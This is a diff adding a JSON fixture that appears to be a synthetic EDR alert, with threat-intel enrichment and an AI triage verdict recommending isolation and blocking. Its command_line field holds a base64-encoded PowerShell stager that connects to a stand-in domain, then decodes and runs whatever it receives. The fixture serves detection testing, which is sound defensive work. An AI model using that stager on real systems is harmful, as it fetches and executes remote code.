@@ -1,0 +1,194 @@
+{
+  "alert_data": {
+    "alert_id": "ALERT-2024-07-13-001",
+    "timestamp": "2024-07-13T14:30:25Z",
+    "source": "EDR_Sensor_001",
+    "severity": "medium",
+    "category": "suspicious_activity",
+    "log_data": {
+      "event_type": "process_creation",
+      "process_name": "powershell.exe",
+      "process_id": 12345,
+      "parent_process": "explorer.exe",
+      "command_line": "powershell.exe -EncodedCommand JABwID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoInN1c3BpY2lvdXMtZG9tYWluLmNvbSIsIDQ0Myk7JABzID0gJHAuR2V0U3RyZWFtKCk7JGIgPSBOZXctT2JqZWN0IGJ5dGVbNjU1MzVdOyRzLlJlYWQoJGIsIDAsLCRiLkxlbmd0aCk7JGV2ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJGIsIDAsLCRiLkxlbmd0aCk7JGV4ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRldikpOyRleCgp",
+      "user": "CORP\\john.doe",
+      "hostname": "WORKSTATION-001",
+      "src_ip": "192.168.1.100",
+      "dst_ip": "185.220.101.45",
+      "dst_port": 443,
+      "domain": "suspicious-domain.com",
+      "file_hash": "a1b2c3d4e5f6789012345678901234567890abcd",
+      "file_path": "C:\\Users\\john.doe\\Downloads\\suspicious_script.ps1"
+    },
+    "indicators": [
+      "suspicious_powershell_execution",
+      "encoded_command",
+      "network_connection",
+      "base64_encoded_payload"
+    ],
+    "metadata": {
+      "detection_rule": "Suspicious PowerShell with Network Activity",
+      "rule_id": "PS-001",
+      "confidence_score": 0.75
+    },
+    "enriched_data": {
+      "src_ip_intel": {
+        "reputation_score": 85,
+        "is_malicious": false,
+        "categories": [
+          "corporate"
+        ],
+        "country": "US",
+        "asn": "AS12345",
+        "last_reported": null
+      },
+      "dst_ip_intel": {
+        "reputation_score": 15,
+        "is_malicious": true,
+        "categories": [
+          "malware",
+          "c2_server",
+          "phishing"
+        ],
+        "recent_reports": 45,
+        "country": "RU",
+        "asn": "AS12346",
+        "last_reported": "2024-07-12T10:15:30Z"
+      },
+      "domain_intel": {
+        "reputation_score": 10,
+        "is_malicious": true,
+        "categories": [
+          "malware_distribution",
+          "c2"
+        ],
+        "last_analysis_date": "2024-07-12T08:30:00Z",
+        "creation_date": "2024-01-15T12:00:00Z",
+        "registrar": "Suspicious Registrar LLC"
+      },
+      "file_intel": {
+        "reputation_score": 5,
+        "is_malicious": true,
+        "categories": [
+          "trojan",
+          "backdoor"
+        ],
+        "detection_ratio": "45/70",
+        "last_analysis_date": "2024-07-13T09:45:00Z"
+      },
+      "historical_context": {
+        "previous_alerts": 3,
+        "previous_incidents": 1,
+        "first_seen": "2024-07-10T16:20:00Z",
+        "last_seen": "2024-07-13T14:30:25Z",
+        "recent_activity": [
+          "Similar PowerShell execution 2 days ago",
+          "Network connection to suspicious IP 1 day ago"
+        ]
+      }
+    }
+  },
+  "enriched_data": {
+    "src_ip_intel": {
+      "reputation_score": 85,
+      "is_malicious": false,
+      "categories": [
+        "corporate"
+      ],
+      "country": "US",
+      "asn": "AS12345",
+      "last_reported": null
+    },
+    "dst_ip_intel": {
+      "reputation_score": 15,
+      "is_malicious": true,
+      "categories": [
+        "malware",
+        "c2_server",
+        "phishing"
+      ],
+      "recent_reports": 45,
+      "country": "RU",
+      "asn": "AS12346",
+      "last_reported": "2024-07-12T10:15:30Z"
+    },
+    "domain_intel": {
+      "reputation_score": 10,
+      "is_malicious": true,
+      "categories": [
+        "malware_distribution",
+        "c2"
+      ],
+      "last_analysis_date": "2024-07-12T08:30:00Z",
+      "creation_date": "2024-01-15T12:00:00Z",
+      "registrar": "Suspicious Registrar LLC"
+    },
+    "file_intel": {
+      "reputation_score": 5,
+      "is_malicious": true,
+      "categories": [
+        "trojan",
+        "backdoor"
+      ],
+      "detection_ratio": "45/70",
+      "last_analysis_date": "2024-07-13T09:45:00Z"
+    },
+    "historical_context": {
+      "previous_alerts": 3,
+      "previous_incidents": 1,
+      "first_seen": "2024-07-10T16:20:00Z",
+      "last_seen": "2024-07-13T14:30:25Z",
+      "recent_activity": [
+        "Similar PowerShell execution 2 days ago",
+        "Network connection to suspicious IP 1 day ago"
+      ]
+    }
+  },
+  "llm_analysis": {
+    "is_true_positive": true,
+    "severity": "high",
+    "confidence": 0.92,
+    "attack_type": "malware",
+    "indicators": [
+      "base64_encoded_powershell_command",
+      "connection_to_malicious_ip",
+      "suspicious_domain_resolution",
+      "malicious_file_hash",
+      "historical_suspicious_activity"
+    ],
+    "recommended_actions": [
+      "Immediately isolate the affected host (WORKSTATION-001)",
+      "Block outbound connections to 185.220.101.45",
+      "Collect memory dump and disk image for forensic analysis",
+      "Reset user credentials for john.doe",
+      "Scan network for similar indicators of compromise",
+      "Update firewall rules to block suspicious-domain.com"
+    ],
+    "analysis_summary": "This is a high-confidence true positive representing a malware infection. The base64-encoded PowerShell command is attempting to establish a reverse shell connection to a known malicious IP address (185.220.101.45) associated with C2 infrastructure. The destination domain is flagged for malware distribution, and the file hash has a high detection ratio. The historical context shows this is part of an ongoing attack campaign targeting the organization. The combination of encoded commands, malicious network connections, and threat intelligence indicators strongly suggests active malware attempting to establish command and control communication."
+  },
+  "final_decision": {
+    "is_true_positive": true,
+    "severity": "high",
+    "confidence": 1.0,
+    "attack_type": "malware",
+    "indicators": [
+      "base64_encoded_powershell_command",
+      "connection_to_malicious_ip",
+      "suspicious_domain_resolution",
+      "malicious_file_hash",
+      "historical_suspicious_activity"
+    ],
+    "recommended_actions": [
+      "Immediately isolate the affected host (WORKSTATION-001)",
+      "Block outbound connections to 185.220.101.45",
+      "Collect memory dump and disk image for forensic analysis",
+      "Reset user credentials for john.doe",
+      "Scan network for similar indicators of compromise",
+      "Update firewall rules to block suspicious-domain.com"
+    ],
+    "analysis_summary": "This is a high-confidence true positive representing a malware infection. The base64-encoded PowerShell command is attempting to establish a reverse shell connection to a known malicious IP address (185.220.101.45) associated with C2 infrastructure. The destination domain is flagged for malware distribution, and the file hash has a high detection ratio. The historical context shows this is part of an ongoing attack campaign targeting the organization. The combination of encoded commands, malicious network connections, and threat intelligence indicators strongly suggests active malware attempting to establish command and control communication.",
+    "final_confidence": 1.0,
+    "ti_confidence_boost": 0.38,
+    "timestamp": "2025-07-13T21:45:46.875461"
+  }
+}
